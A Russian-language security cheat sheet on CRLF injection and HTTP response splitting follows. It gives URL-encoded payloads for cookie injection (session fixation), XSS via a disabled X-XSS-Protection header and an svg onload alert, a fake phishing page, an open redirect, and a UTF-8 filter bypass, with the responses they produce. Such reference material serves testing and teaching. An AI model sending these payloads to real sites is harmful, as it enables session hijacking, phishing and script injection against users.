> **CRLF-инъекция(Carriage Return Line Feed Injection)** — это уязвимость веб-безопасности, которая возникает, когда пользователь внедряет в приложение неожиданные символы возврата каретки (CR) (`\r`) и перевода строки (LF) (`\n`). Эти символы используются для обозначения конца строки и начала новой в сетевых протоколах, таких как HTTP, SMTP и других. В протоколе HTTP последовательность CR-LF всегда используется для завершения строки.

*   [Методология](#Методология)
    *   [Фиксация сессии (Session Fixation)](#Фиксация-сессии-Session-Fixation)
    *   [Межсайтовый скриптинг (XSS)](#Межсайтовый-скриптинг-XSS)
    *   [Открытое перенаправление (Open Redirect)](#Открытое-перенаправление-Open-Redirect)
*   [Обход фильтров](#Обход-фильтров)
*   [Ссылки](#URL)

# Методология

**Расщепление HTTP-ответа (HTTP Response Splitting)** — это уязвимость безопасности, при которой пользователь манипулирует HTTP-ответом, внедряя символы возврата каретки (CR) и перевода строки (LF) (вместе называемые CRLF) в заголовок ответа. Эти символы отмечают конец заголовка и начало новой строки в HTTP-ответах.

**Символы CRLF:**

*   `**CR**` (`\r`, ASCII 13): Перемещает курсор в начало строки.
*   `**LF**` (`\n`, ASCII 10): Перемещает курсор на следующую строку.

Внедряя последовательность CRLF, пользователь может разбить ответ на две части, фактически контролируя структуру HTTP-ответа. Это может привести к различным проблемам безопасности, таким как:

*   **Межсайтовый скриптинг (XSS):** Внедрение вредоносных скриптов во второй ответ.
*   **Отравление кэша (Cache Poisoning):** Принудительное сохранение некорректного содержимого в кэшах.
*   **Манипуляция заголовками:** Изменение заголовков для введения в заблуждение пользователей или систем.

## Фиксация сессии (Session Fixation)

Типичный заголовок HTTP-ответа выглядит так:

```python
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

Если вводимое пользователем значение `value\r\nSet-Cookie: admin=true` встраивается в заголовки без очистки:

```python
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Теперь пользователь установил свой собственный cookie.

## Межсайтовый скриптинг (XSS)

Помимо фиксации сессии, которая требует очень небезопасного способа обработки пользовательских сессий, самый простой способ использования CRLF-инъекции — это запись нового тела для страницы. Это может быть использовано для создания фишинговой страницы или для запуска произвольного JavaScript-кода (XSS).

**Запрошенная страница:**
```python
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

**HTTP-ответ:**
```python
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

В случае XSS CRLF-инъекция позволяет внедрить заголовок `X-XSS-Protection` со значением "0", чтобы отключить его. А затем мы можем добавить наш HTML-тег, содержащий JavaScript-код.

**Запрошенная страница:**
```python
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**HTTP-ответ:**
```python
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[ИНЪЕКЦИЯ НАЧИНАЕТСЯ ЗДЕСЬ]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## Открытое перенаправление (Open Redirect)

Внедрение заголовка `Location` для принудительного перенаправления пользователя.

```python
%0d%0aLocation:%20http://myweb.com
```

# Обход фильтров

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) гласит, что большинство значений полей заголовков HTTP используют только подмножество кодировки US-ASCII.

> Вновь определенные поля заголовков ДОЛЖНЫ ограничивать свои значения октетами US-ASCII.

Firefox следовал спецификации, удаляя все символы вне допустимого диапазона при установке cookie вместо их кодирования.

| UTF-8 Символ | Hex      | Unicode | Результат удаления |
| :----------- | :------- | :------ | :----------------- |
| 嘊           | %E5%98%8A | \u560a  | %0A (\n)           |
| 嘍           | %E5%98%8D | \u560d  | %0D (\r)           |
| 嘾           | %E5%98%BE | \u563e  | %3E (>)            |
| 嘼           | %E5%98%BC | \u563c  | %3C (<)            |

UTF-8 символ 嘊 содержит `0a` в последней части своего шестнадцатеричного формата, который будет преобразован Firefox как `\n`.

**Пример полезной нагрузки с использованием UTF-8 символов:**

```python
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

**Версия в URL-кодировке:**

```python
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

# URL

* [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1:192749)
